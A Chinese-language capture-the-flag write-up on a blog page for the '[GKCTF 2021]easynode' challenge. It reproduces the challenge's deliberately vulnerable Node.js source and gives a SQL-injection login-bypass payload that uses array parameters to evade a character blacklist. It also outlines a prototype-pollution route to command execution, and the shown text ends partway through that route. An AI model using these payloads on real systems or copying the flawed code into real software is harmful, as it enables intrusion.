@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="1title: [GKCTF 2021]easynode  pay-to-win      ez-sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="world">
+<meta property="og:url" content="http://example.com/2023/06/23/[GKCTF%202021]easynode/index.html">
+<meta property="og:site_name" content="world">
+<meta property="og:description" content="1title: [GKCTF 2021]easynode  pay-to-win      ez-sql">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623200720308.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623202457538.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623202538937.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623202834889.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623203247062.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623203433315.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623203626318.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623203732989.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623203911427.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623204436847.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623212736026.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623213154037.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623213341087.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623214121129.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623214302527.png">
+<meta property="article:published_time" content="2023-06-23T13:44:04.434Z">
+<meta property="article:modified_time" content="2023-06-23T13:45:46.618Z">
+<meta property="article:author" content="Alpha">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20230623200720308.png">
+
+<link rel="canonical" href="http://example.com/2023/06/23/[GKCTF%202021]easynode/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | world</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">world</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">52</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/23/[GKCTF%202021]easynode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="Alpha">
+      <meta itemprop="description" content="forever">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="world">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-06-23 21:44:04 / 修改时间：21:45:46" itemprop="dateCreated datePublished" datetime="2023-06-23T21:44:04+08:00">2023-06-23</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/06/23/%5BGKCTF%202021%5Deasynode/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/06/23/%5BGKCTF%202021%5Deasynode/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title: [GKCTF 2021]easynode</span><br></pre></td></tr></table></figure>
+
+<p>pay-to-win      ez-sql</p>
+<span id="more"></span>
+
+<meta name="referrer" content="no-referrer">
+
+<p>给了源码，看看源码，最重要的是index.js</p>
+<p>直接看index.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> format = <span class="built_in">require</span>(<span class="string">&#x27;string-format&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; select,close &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./tools&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> extend = <span class="built_in">require</span>(<span class="string">&quot;js-extend&quot;</span>).<span class="property">extend</span></span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;generateToken,verifyToken&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;./encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>((__dirname+<span class="string">&#x27;/public/&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">safeQuery</span> =  <span class="keyword">async</span> (<span class="params">username,password</span>)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">waf</span> = (<span class="params">str</span>)=&gt;&#123;</span><br><span class="line">        <span class="comment">// console.log(str);</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">safeStr</span> = (<span class="params">str</span>)=&gt;&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            str =  str.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + str.<span class="title function_">slice</span>(i + <span class="number">1</span>, str.<span class="property">length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = <span class="title function_">safeStr</span>(username);</span><br><span class="line">    password = <span class="title function_">safeStr</span>(password);</span><br><span class="line">    <span class="keyword">let</span> sql = <span class="title function_">format</span>(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>),password.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">    <span class="comment">// console.log(sql);</span></span><br><span class="line">    result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql)));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/index.html&quot;</span>)</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">    res.<span class="title function_">end</span>(html)</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="title function_">safeQuery</span>(username,password).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">result</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">const</span> token = <span class="title function_">generateToken</span>(username)</span><br><span class="line">                res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                    <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;yes&quot;</span>,<span class="string">&quot;token&quot;</span>:token</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">json</span>(</span><br><span class="line">                    &#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;username or password wrong&quot;</span>&#125;</span><br><span class="line">                    );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span>=&gt;</span>&#123;res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;something wrong!&quot;</span>&#125;);&#125;);</span><br><span class="line">  &#125;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/admin&quot;</span>,<span class="keyword">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">`select board from board where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>())));  </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/admin.ejs&quot;</span>,&#123;board,username&#125;)</span><br><span class="line">        res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(html)</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;stop!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/addAdmin&quot;</span>,<span class="keyword">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        gift = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; [username]:&#123;<span class="attr">name</span>:<span class="string">&quot;Blue-Eyes White Dragon&quot;</span>,<span class="attr">ATK</span>:<span class="string">&quot;3000&quot;</span>,<span class="attr">DEF</span>:<span class="string">&quot;2500&quot;</span>,<span class="attr">URL</span>:<span class="string">&quot;https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO test (username, password) VALUES (&quot;&#123;&#125;&quot;,&quot;&#123;&#125;&quot;) &#x27;</span>,username,password);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO board (username, board) VALUES (\&#x27;&#123;&#125;\&#x27;,\&#x27;&#123;&#125;\&#x27;) &#x27;</span>,username,gift);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;add admin successful!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;stop!!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/adminDIV&quot;</span>,<span class="title function_">async</span>(req,res,next) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> data =  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">data</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span>(result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        <span class="keyword">var</span> sql =<span class="string">&#x27;select board from board&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()))); </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">            <span class="keyword">var</span> addDIV = <span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;data[key]&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_">extend</span>(board,<span class="title class_">JSON</span>.<span class="title function_">parse</span>(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;addDiv successful!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>
+
+<p>一步一步看代码</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623200720308.png" alt="image-20230623200720308"></p>
+<p>这里是将username和password进行一个验证，如果有<code>*blacklist* = [&#39;\\&#39;,&#39;\^&#39;,&#39;)&#39;,&#39;(&#39;,&#39;\&quot;&#39;,&#39;\&#39;&#39;]</code>黑名单里的字符就会将字符替换成<code>*</code>号</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202457538.png" alt="image-20230623202457538"></p>
+<p>这里有一个拼接操作，后面这里有用，会讲到</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202538937.png" alt="image-20230623202538937"></p>
+<p>根目录路由，没什么用，就是返回一个主页</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202834889.png" alt="image-20230623202834889"></p>
+<p>&#x2F;login路由，判断username和passord是否是正确的，用的就是<code>safeQuery</code>自定义函数，如果正确就会返回一个token，不正确就返回用户名或者密码错误</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203247062.png" alt="image-20230623203247062"></p>
+<p>&#x2F;admin路由，先检验token，需要登录成功后才能访问，然后模板渲染ejs，一般会有原型链污染</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203433315.png" alt="image-20230623203433315"></p>
+<p>&#x2F;addAdmin路由，看名字就知道能添加用户，但也是需要先登录才能使用这个路由，然后输入username和password后就会将信息插入到数据库中</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203626318.png" alt="image-20230623203626318"></p>
+<p>&#x2F;adminDIV路由，最后一个路由，看到也是进行了一个token检验，看到有一个extend</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203732989.png" alt="image-20230623203732989"></p>
+<p>这里如果将username和data的键值进行了拼接，返回了一个json数据，然后进行extend，然后一个board</p>
+<p>我们在&#x2F;admin路由看到有</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203911427.png" alt="image-20230623203911427"></p>
+<p>这里也有一个board，如果可以利用&#x2F;adminDIV路由，让username等于<code>__proto__</code>，data是反弹shell命令，然后经过&#x2F;admin路由进行模板渲染是不是就能成功执行命令，而且username也是可控的，可以通过&#x2F;addAdmin路由来改变username</p>
+<p>既然有思路了，那么就需要先登录</p>
+<p>返回到登录路由来，通过sql语句就能登录成功</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623204436847.png" alt="image-20230623204436847"></p>
+<p>可以让username等于<code>admin&#39;#</code>，passoword随便一个值都可以，这样sql语句就变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where username = &#x27;admin&#x27;#&#x27; and password = &#x27;111&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这样就能成功登录，绕过黑名单可以使用数组，根据js的题型，将数组与数组进行拼接后，数组就会变成字符串</p>
+<p>因为只有匹配到黑名单后才会进行拼接，所以需要让他匹配到</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]=admin&#x27;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=111</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623212736026.png" alt="image-20230623212736026"></p>
+<p>成功得到了token，接下来就按照思路来就行</p>
+<p>先是创造一个用户名是<code>__proto__</code>的用户，密码随意</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623213154037.png" alt="image-20230623213154037"></p>
+<p>返回<code>add admin successful!</code>即可，然后登录这个用户，会返回这个用户的token，后面都是使用的这个token</p>
